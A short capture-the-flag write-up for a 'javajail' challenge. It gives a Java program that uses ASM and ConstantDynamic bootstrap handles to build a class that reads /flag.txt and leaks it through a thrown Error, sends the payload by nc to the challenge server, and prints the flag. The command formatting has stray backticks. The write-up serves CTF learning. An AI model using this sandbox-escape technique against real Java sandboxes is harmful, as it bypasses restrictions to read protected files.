# misc - javajail

Compile:
`javac --add-exports` `java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED Gen.java`

Generate payload:
`java --add-exports`j`ava.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED Gen`
 
Send the payload:
```java --add-exports java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED Gen \
| tail -n1 \
| nc 35.194.108.145 41992 ```

Flag:`tkbctf{my_fr13nd_c0ndy_br34k5_y0u_ou7_0f_j4il!}`

```
import java.util.Base64;
import jdk.internal.org.objectweb.asm.ClassWriter;
import jdk.internal.org.objectweb.asm.ConstantDynamic;
import jdk.internal.org.objectweb.asm.Handle;
import jdk.internal.org.objectweb.asm.MethodVisitor;
import jdk.internal.org.objectweb.asm.Opcodes;

public class Gen implements Opcodes {
    public static void main(String[] args) throws Exception {
        ClassWriter cw = new ClassWriter(0);

        cw.visit(V21, ACC_PUBLIC, "X", null, "java/lang/Object", null);

        MethodVisitor mv = cw.visitMethod(ACC_PUBLIC | ACC_STATIC, "run", "()V", null, null);
        mv.visitCode();

        Handle bsm = new Handle(
            H_INVOKESTATIC,
            "java/lang/invoke/ConstantBootstraps",
            "invoke",
            "(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/Class;Ljava/lang/invoke/MethodHandle;[Ljava/lang/Object;)Ljava/lang/Object;",
            false
        );

        Handle hNewFIS = new Handle(
            H_NEWINVOKESPECIAL,
            "java/io/FileInputStream",
            "<init>",
            "(Ljava/lang/String;)V",
            false
        );

        Handle hReadAllBytes = new Handle(
            H_INVOKEVIRTUAL,
            "java/io/InputStream",
            "readAllBytes",
            "()[B",
            false
        );

        Handle hNewString = new Handle(
            H_NEWINVOKESPECIAL,
            "java/lang/String",
            "<init>",
            "([B)V",
            false
        );

        Handle hNewError = new Handle(
            H_NEWINVOKESPECIAL,
            "java/lang/Error",
            "<init>",
            "(Ljava/lang/String;)V",
            false
        );

        ConstantDynamic cdFile = new ConstantDynamic(
            "a",
            "Ljava/lang/Object;",
            bsm,
            hNewFIS,
            "/flag.txt"
        );

        ConstantDynamic cdBytes = new ConstantDynamic(
            "a",
            "Ljava/lang/Object;",
            bsm,
            hReadAllBytes,
            cdFile
        );

        ConstantDynamic cdStr = new ConstantDynamic(
            "a",
            "Ljava/lang/Object;",
            bsm,
            hNewString,
            cdBytes
        );

        ConstantDynamic cdErr = new ConstantDynamic(
            "a",
            "Ljava/lang/Object;",
            bsm,
            hNewError,
            cdStr
        );

        mv.visitLdcInsn(cdErr);
        mv.visitTypeInsn(CHECKCAST, "java/lang/Error");
        mv.visitInsn(ATHROW);

        mv.visitMaxs(1, 0);
        mv.visitEnd();

        cw.visitEnd();
        byte[] clazz = cw.toByteArray();

        System.out.println("size = " + clazz.length);
        System.out.println(Base64.getEncoder().encodeToString(clazz));
    }
}
```

Compiled by: yappare
Solved by: g10d